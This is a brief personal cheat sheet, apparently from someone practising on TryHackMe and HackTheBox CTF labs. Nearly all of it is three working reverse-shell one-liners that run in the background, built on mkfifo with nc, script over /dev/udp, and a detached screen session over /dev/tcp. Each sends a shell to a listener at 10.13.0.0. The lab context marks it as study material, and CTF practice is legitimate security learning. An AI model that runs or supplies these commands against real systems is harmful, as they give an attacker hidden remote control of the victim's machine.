# Stuff learned from THM, HTB and other CTF's

I'll try to organize this as best as I can.
```

Background Reverse Shells:
% mkfifo with nc example
        (mkfifo /tmp/MmE1M; nc 10.13.0.0 443 0</tmp/MmE1M | /bin/sh >/tmp/MmE1M 2>&1; rm /tmp/MmE1M) &
 
% other examples
        script -c 'bash -i' /dev/null </dev/udp/10.13.0.0/9001 >&0 2>&1 &
 
        screen -md bash -c 'bash -i >/dev/tcp/10.13.0.0/443 2>&1 0<&1' -md ('start a new detached process')
```